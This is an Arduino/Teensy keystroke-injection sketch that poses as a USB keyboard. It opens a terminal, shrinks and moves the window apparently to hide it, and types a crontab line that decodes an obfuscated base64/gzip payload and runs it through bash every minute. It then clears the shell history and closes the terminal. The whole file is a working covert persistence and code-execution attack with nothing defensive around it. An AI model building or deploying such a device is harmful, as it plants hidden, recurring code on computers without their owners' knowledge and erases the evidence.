#include "Keyboard.h"
#include "stdio.h"
#include "stdlib.h"
#define INTER_T 70
#define INTER_ANIM 300

void lettre(char c) {
  Keyboard.press(c);
  delay(7);
  Keyboard.release(c);
  delay(7);
}

void chaine(char chaine[])
{
  for (short i = 0; i < strlen(chaine); i++) {
    lettre(chaine[i]);
  }
}


void t_t_touche(char t1 ,char t2) {
  Keyboard.press(t1);
  Keyboard.press(t2);
  delay(INTER_T);
  Keyboard.release(t1);
  Keyboard.release(t2);
  delay(INTER_T);
}

void windows(){
  Keyboard.press(KEY_LEFT_GUI);
  delay(INTER_T);
  Keyboard.release(KEY_LEFT_GUI);
  delay(INTER_ANIM);
}

void enter(){
  Keyboard.press(KEY_ENTER);
  delay(INTER_T);
  Keyboard.release(KEY_ENTER);
  delay(INTER_ANIM);
}

void touche(char t) {
  Keyboard.press(t);
  delay(INTER_T);
  Keyboard.release(t);
  delay(INTER_T);
}

void setup() { 
  Keyboard.begin(); 
  Serial.begin(9600);

}

void loop() {
  delay(5000);

  //OPEN Terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_T);
  delay(INTER_T);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(KEY_T);
  delay(INTER_T);
  delay(INTER_T);


  // ALT F8 Resize
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.press(KEY_F8);
  delay(INTER_T);
  Keyboard.release(KEY_F8);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(INTER_T);
  
  

    //Resize
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.press(KEY_DOWN);
  delay(INTER_T);
  Keyboard.release(KEY_DOWN);
  Keyboard.press(KEY_UP);
  delay(INTER_T);
  Keyboard.release(KEY_UP);
  Keyboard.press(KEY_LEFT);
  delay(INTER_T);
  Keyboard.release(KEY_LEFT);
  Keyboard.press(KEY_RIGHT);
  delay(INTER_T);
  Keyboard.release(KEY_RIGHT);
  Keyboard.set_modifier(0);
  Keyboard.send_now();


  // MOVE ALT F7
  Keyboard.press(KEY_ENTER);
  delay(INTER_T);
  Keyboard.release(KEY_ENTER);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.press(KEY_F7);
  delay(INTER_T);
  Keyboard.release(KEY_F7);
  Keyboard.set_modifier(0);
  Keyboard.send_now();  
 

    //Resize
  Keyboard.set_modifier(MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.press(KEY_DOWN);
  delay(INTER_T);
  Keyboard.release(KEY_DOWN);
  Keyboard.press(KEY_DOWN);
  delay(INTER_T);
  Keyboard.release(KEY_DOWN);
  Keyboard.press(KEY_RIGHT);
  delay(INTER_T);
  Keyboard.release(KEY_RIGHT);
  Keyboard.press(KEY_RIGHT);
  delay(INTER_T);
  Keyboard.release(KEY_RIGHT);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  

  chaine (" echo \"* * * * * echo 'H4sIAAAAAAAAA6WT32rCMBSH7/sUP2KHCRK7bFiZscLYa3hT8mcGukRcNyau775YderFWKXnpkk5Pd8556M2bGDhPFJqndfIVuHNZNvSe/eevQRvnTa+dqbKwOvt2sTkhwUybT4z/1FVTEKHBDFUkVJV1iCpJUy2r9bOv2IixtPpWDw9jvMJuIIAX8ckatQqgHuQeRvWVWbRBsE3ggZ/ho9IfIl4rzfgGkMs/ZARmSRt+fhJVRByOMcxKHXFvYTDPA5DRQ4Omu4GtsEdRM5Y7NWNRuzc8rlIuts/m8GhmA7eHBHFRaMxqTkmEnbq4cBFgRN5D9wfR0ULvYJ1W0hkzFI3E3nz7yqwuHAhfzltKbL053FkcrMRXdZldyM3CFE9hKhrIepSyF8+VG8fqqsP2Wfh8f/rvO8j4gcNrJ5SvgMAAA==' | base64 -d | gzip -d | bash\" | crontab -");  
  enter();
  chaine (" history -c");
  enter();
  chaine (" exit");
  enter();
  
  
   delay(5000);
}
